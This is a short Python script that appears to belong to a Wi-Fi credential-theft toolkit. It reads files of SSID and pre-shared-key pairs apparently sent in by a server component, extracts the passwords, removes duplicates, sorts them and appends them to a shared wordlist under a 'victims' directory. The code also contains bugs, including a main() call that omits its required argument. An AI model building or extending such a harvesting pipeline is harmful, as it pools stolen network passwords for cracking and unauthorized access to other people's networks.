""" Will receive file name (0x*) from sever.py .
    It will open , read all passwords , sort , remove
    repetitions and store in Wordlist

main(file_name)
open(file_name)

"""


import re
import os
import subprocess
import fnmatch

LOCATION = ''
FILE_NAME = ''
FILE_DESC = ''
WORDLIST = '../victims/Wordlist'
PASSWORDS = list()
passwords_string =''

def main(file_name):
    open_file(file_name)
    get_passwords()
    append_wordlist()

def open_file(file_name):
    global FILE_NAME, FILE_DESC
    FILE_NAME = file_name
    FILE_DESC = open(FILE_NAME, 'r')


def get_passwords():
    global PASSWORDS , passwords_string
    CONTENT = FILE_DESC.read().strip('\n').split('\n')
    print("File : ",FILE_NAME,"  with ",len(CONTENT)," SSID,PSK" )
    PASSWORDS[:] = [] # Clearing the list PASSWORDS
    for pair in CONTENT:
       	password = pair.split(',')[1]
        PASSWORDS.append(password)
    PASSWORDS = filter(PASSWORDS)
    print("Appending ",len(PASSWORDS)," unique PSK to Wordlist")
    # Again putting it into a string
    passwords_string = '\n'.join(PASSWORDS)+'\n'


def filter(CONTENT):
    # Remove duplicates
    NEW_CONTENT = []
    for password in CONTENT:
        if password not in NEW_CONTENT:
            NEW_CONTENT.append(password)

    # Arrange in ascending order
    NEW_CONTENT.sort()
    return NEW_CONTENT



def append_wordlist():
    wordlist = open(WORDLIST,'a')
    wordlist.write(passwords_string)
    wordlist.close()

if __name__ == '__main__':
    main()
